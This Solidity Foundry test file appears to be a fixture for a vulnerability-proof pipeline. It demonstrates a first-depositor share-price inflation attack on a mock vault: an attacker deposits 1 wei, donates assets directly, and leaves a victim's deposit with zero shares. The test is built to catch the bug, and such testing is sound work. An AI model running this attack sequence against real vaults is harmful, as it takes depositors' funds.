// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./MiniVault.sol";
import "./MockERC20.sol";

/// @dev Minimal forge-std Vm cheatcode surface so the fixture is self-contained
/// (no external lib import needed for the proof pipeline to parse it). When run
/// under `forge test`, the canonical VM at this address services prank/deal.
interface Vm {
    function prank(address) external;
    function startPrank(address) external;
    function stopPrank() external;
}

/// @notice EVM 0-day proof-pipeline VULNERABLE fixture PoC.
///
/// Proof contract (real entrypoint -> asserted impact -> negative control):
///   1. Real entrypoint: drives the unmodified MiniVault.deposit / redeem; no
///      stub or re-implementation of the vault's accounting (Rule 40 point 1).
///   2. Asserted impact: a victim who deposits a real, non-dust amount must
///      receive > 0 shares (cannot be griefed to zero by a front-running
///      attacker who inflates the share price via direct asset donation).
///   3. State snapshot: victim share balance read before/after (Rule 40 pt 5).
///   4. Negative control: identical assertion passes on the fixed vault in the
///      sibling ../erc4626_share_price_clean directory (Rule 40 point 4).
///
/// Expected outcome: this PoC FAILS on the vulnerable MiniVault -> the bug is
/// CAUGHT. Run:  forge test --match-path '*MiniVault.t.sol'
contract MiniVaultExploitTest {
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    MockERC20 internal token;
    MiniVault internal vault;

    address internal attacker = address(0xA11CE);
    address internal victim = address(0xB0B);

    function setUp() public {
        token = new MockERC20();
        vault = new MiniVault(address(token));
        token.mint(attacker, 1_000_000 ether);
        token.mint(victim, 1_000_000 ether);
    }

    /// @notice Deterministic PoC. Asserts the real impact; reverts on the
    /// VULNERABLE vault (bug CAUGHT), passes on the fixed vault (control).
    function test_first_depositor_inflation() public {
        // Attacker mints 1 wei of shares.
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        // Attacker donates assets directly to the vault, inflating share price.
        token.transfer(address(vault), 100 ether);
        vm.stopPrank();

        // Victim deposits a real, non-dust amount (< inflated price -> 0 shares).
        uint256 victimSharesBefore = vault.shares(victim);
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(50 ether, victim);
        vm.stopPrank();
        uint256 victimSharesAfter = vault.shares(victim);

        // ASSERTED IMPACT: a real deposit must mint shares for the victim.
        require(
            victimSharesAfter > victimSharesBefore,
            "INVARIANT VIOLATED: victim deposit minted zero shares (share-price inflation)"
        );
    }

}
